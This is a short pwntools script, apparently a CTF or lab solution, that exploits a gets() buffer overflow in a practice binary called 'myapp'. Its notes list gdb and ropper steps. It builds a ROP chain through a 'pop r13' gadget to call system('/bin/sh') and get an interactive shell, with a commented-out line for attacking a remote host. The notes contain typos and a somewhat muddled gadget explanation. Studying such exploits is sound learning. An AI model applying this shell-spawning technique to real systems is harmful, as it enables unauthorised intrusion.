#!/usr/bin/env python

"""
# step 1
get function address
=> gdb myapp
=> info functions

main
0x40115f

test
0x401152



# step 2
disass fucntion and read the code

=> disass main
we can see it had 0x70 equals to 120 byte size used fo gets function

at the same time it had system@plt address is 40116e
we need to use this address to invoke our shell code


=> disass test

0x0000000000401152 <+0>:     push   rbp
0x0000000000401153 <+1>:     mov    rbp,rsp
0x0000000000401156 <+4>:     mov    rdi,rsp
0x0000000000401159 <+7>:     jmp    r13
0x000000000040115c <+10>:    nop
0x000000000040115d <+11>:    pop    rbp
0x000000000040115e <+12>:    ret

jmp r13
0x401159

so we need to search the system call this address
ropper --search "pop r13" -f myapp
0x0000000000401206: pop r13; pop r14; pop r15; ret;

it return the address is 0x401206


# step 3


payload = junk + shell + pop_r13 + system + null + null + mov_rdi_rsp

junk = ("A"*120).encdoe()
shell = "/bin/sh\x00".encode()
pop_r13 = p64(0x401206)
system = p64(0x40116e)
null = p64(0x0)
mov_rdi_rsp = p64(0x401152) # from test function push rbp

"""




from pwn import *

# Set up pwntools to work with this binary
elf = ELF('myapp')
context(os="linux", arch="amd64")

# remote
# p = remote("192.168.2.1", 1337)
io = process(elf.path)




junk = ("A"*120).encode()
shell = "/bin/sh\x00".encode()
pop_r13 = p64(0x401206)
system = p64(0x40116e)
null = p64(0x0)
mov_rdi_rsp = p64(0x401152) # from test function push rbp

payload = junk + shell + pop_r13 + system + null + null + mov_rdi_rsp


io.sendline(payload)
io.interactive()
